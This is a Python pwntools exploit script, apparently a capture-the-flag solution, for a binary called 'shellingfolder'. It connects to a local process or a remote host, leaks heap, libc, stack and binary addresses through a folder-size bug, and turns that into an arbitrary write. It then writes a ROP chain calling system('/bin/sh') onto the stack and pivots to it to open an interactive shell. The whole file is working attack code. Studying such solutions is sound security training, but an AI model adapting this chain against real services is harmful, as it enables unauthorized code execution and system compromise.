#!/usr/bin/env python2

from pwn import *
import sys

local = len(sys.argv) <= 1
if local:
    p = process('./shellingfolder_42848afa70a13434679fac53a471239255753260')
    #  gdb.attach(p, '''
#  source ~/ctf-tools/peda/peda/peda.py
#  continue
#  ''')
else:
    p = remote('52.69.237.212', 4869)

def readmenu():
    p.recvuntil('ShellingFolder')
    p.recvuntil('**************************************')
    p.recvuntil('**************************************')

def create_file(s, size=0):
    readmenu()
    p.sendline('4')
    p.recvuntil('Name of File:')
    p.sendline(s[:30])
    p.recvuntil('Size of File:')
    ssize = u32(p32(size))
    p.sendline(str(ssize))
    p.recvuntil('successful\n')

def create_dir(s):
    readmenu()
    p.sendline('3')
    p.recvuntil('Name of Folder:')
    p.sendline(s)
    p.recvuntil('successful\n')

def delete_file(s):
    readmenu()
    p.sendline('5')
    p.recvuntil('Choose a Folder or file :')
    p.sendline(s)

def leak_heap():
    filename = 'B'*24
    create_file(filename)
    readmenu()
    p.sendline('6')
    t = p.recvuntil('**************************************')
    t = t[t.index(':')+1:]
    t = t[:t.index(' : size')]
    t = t[24:].ljust(8, '\x00')
    res = u64(t)
    delete_file(filename)
    return res

old_first_subfolder = None
g_a = 'A'

def leak_prep(root, addr, is_hi, old_n):
    global g_a
    filename = g_a*24 + p64(root)
    g_a = chr(ord(g_a) + 1)

    if is_hi:
        addr = (addr >> 32)
        old = (old_n >> 32)
        size = addr - old
        old_n = (addr << 32) | (old_n & 0xffffffff)
    else:
        neg = False
        old = old_n & 0xffffffff
        addr = addr & 0xffffffff

        if addr < old:
            old += 0x100000000

        size = addr - old
        if size > 0x7fffffff:
            neg = True

        old_n = (((old_n >> 32) - (1 if neg else 0)) << 32) | (addr & 0xffffffff)

    size = size & 0xffffffff
    create_file(filename, size=size)
    return filename[:filename.index('\x00')], old_n

def leak(root, addr):
    global old_first_subfolder
    # prepare the files to write addr - 88 inside the 10th sub folder of the root dir
    addr -= 88
    f1, old_first_subfolder = leak_prep(root + 9 * 8, addr, False, old_first_subfolder)
    f2, old_first_subfolder = leak_prep(root + 9 * 8 + 4, addr, True, old_first_subfolder)
    old_first_subfolder = addr

    # trigger the vuln to overwrite the 10th sub folder pointer
    t = ''
    readmenu()
    p.sendline('6')

    # leak data with the list function
    readmenu()
    p.sendline('1')
    t = p.recvuntil('**************************************')
    t = t[t.index('----------------------\n')+len('----------------------\n'):]
    t = t[:t.index('-------------')]
    t = t.split('\n')[-2]
    if t.startswith('\x1B[32m'):
        t = t[len('\x1B[32m'):]
    if t.endswith('1b5b306d'.decode('hex')):
        t = t[:t.index('1b5b306d'.decode('hex'))]

    delete_file(f1)
    delete_file(f2)
    return t

def leak_addr(root, addr):
    return u64(leak(root, addr)[:8].ljust(8, '\x00'))

old_write_addr = None
def write(addr, val, exploit=False):
    global old_write_addr
    # prepare the files to write the value at addr
    f1, old_write_addr = leak_prep(addr, val, False, old_write_addr)
    f2, old_write_addr = leak_prep(addr + 4, val, True, old_write_addr)
    old_write_addr = val

    # trigger the vuln to overwrite addr
    readmenu()
    p.sendline('6')

    if exploit:
        p.recvuntil('The size of the folder is')
        p.recvuntil('\n')
        p.sendline('ls /home/shellingfolder/')
        p.interactive()
        sys.exit(1)

    delete_file(f1)
    delete_file(f2)

# leak an heap address
heap_leak = leak_heap()
root_folder = heap_leak - 0x78
heap_base = root_folder - 0x10
old_first_subfolder = 0
print '[+] heap_leak = %#x' % (heap_leak,)
print '[+] root folder = %#x' % (root_folder,)
print '[+] heap_base = %#x' % (heap_base,)

#  # try to leak an address in the libc
create_dir('AAAA')
create_dir('BBBB')
create_dir('CCCC')
create_dir('DDDD')
create_dir('EEEE')
delete_file('DDDD')
delete_file('BBBB')
delete_file('AAAA')

# now there should be some libc addresses on the heap (bins pointers)
libc_leak = leak_addr(root_folder, heap_base + 0x130)
libc_base = libc_leak - 2936
print '[+] libc_leak = %#x' % (libc_leak,)
print '[+] libc_base = %#x' % (libc_base,)

stack_address_in_heap = libc_base + 0x2f98
print '[+] stack leak should be @ %#x' % (stack_address_in_heap,)

# get a leak of the stack. from there we should be able to read some pointer of the executable
environ_stack = leak_addr(root_folder, stack_address_in_heap)
print '[+] stack_leak = %#x' % (environ_stack,)
hlt_addr = leak_addr(root_folder, environ_stack - 0x30)
bin_base = hlt_addr - 0xac9
func_ret = environ_stack - 240 - 0x20
print '[+] binary base = %#x' % (bin_base,)
print '[+] func return @ %#x' % (func_ret,)

libc_code_base = libc_base - 0x3c3000
system_addr = libc_code_base + 0x45380
print '[+] system @ %#x' % (system_addr,)

# write things on the stack, in an area that is never touched (just above the
# main function stack frame)
stack_pivot = libc_code_base + 0x8dd0e
poprdi = libc_code_base + 0x21102
binsh_addr = libc_code_base + 0x0018c58b
chain = [poprdi, binsh_addr, system_addr]
for idx, addr in enumerate(range(func_ret + 0x100 + 8, func_ret + 0x100 + 8 + 8 * len(chain), 8)):
    if idx == 0:
        old_write_addr = 0
    else:
        buf = []
        t = leak(root_folder, addr)
        if t == '':
            buf.append(t.ljust(4, '\x00'))
            buf.append(leak(root_folder, addr + 4)[:4].ljust(4, '\x00'))
        else:
            buf.append(t.ljust(8, '\x00'))
        old_write_addr = u64(''.join(buf).ljust(8, '\x00'))

    print '[i] writing %#x to %#x (old value %#x)' % (chain[idx], addr, old_write_addr)
    write(addr, chain[idx])

# return address of "calculate size" function
old_write_addr = bin_base + 0x1669
# now overwrite the return address of the "calculate size" function itself, so
# that it will pivot the stack and start executing the ROP chain we created before.
print '[i] writing %#x to %#x (old value %#x)' % (stack_pivot, func_ret, old_write_addr)
write(func_ret, stack_pivot, True)

p.interactive()
p.close()
